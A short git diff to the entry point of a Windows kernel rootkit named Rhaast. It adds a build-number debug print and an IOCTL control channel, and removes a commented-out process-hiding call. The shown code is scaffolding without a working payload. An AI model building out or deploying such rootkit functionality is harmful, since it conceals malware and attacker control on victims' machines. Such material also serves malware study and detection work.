@@ -1,5 +1,7 @@
 #include <Rhaast.h>
 
+extern PSHORT NtBuildNumber;
+
 /**
  * @brief
  *      main entry point of the rhaast rootkit
@@ -18,11 +20,13 @@ NTSTATUS RhaastEntry(
 
     /* print driver object data */
     PRINTF( 
-        "Rhaast Driver Object: \n"
-        " - Type        : %x   \n"
-        " - Driver Name : %ls  \n",
+        "Rhaast Driver Object:  \n"
+        " - Type          : %x  \n"
+        " - Driver Name   : %ls \n"
+        " - NtBuildNumber : %ld \n",
         Instance.DriverObject->Type,
-        Instance.DriverObject->DriverName.Buffer
+        Instance.DriverObject->DriverName.Buffer,
+        *NtBuildNumber
     )
 
     /* init driver and other resources/info */
@@ -31,8 +35,10 @@ NTSTATUS RhaastEntry(
         return NtStatus;
     }
 
-    /* Process hide */
-    // ProcessHide( 9952 );
+    /* init I/O communication over IOCTLs */
+    if ( ! NT_SUCCESS( NtStatus = TsIoCtlInit() ) ) {
+        PRINTF( "Failed init IOCTL communication: %p\n", NtStatus )
+    }
     
     return NtStatus; 
 }
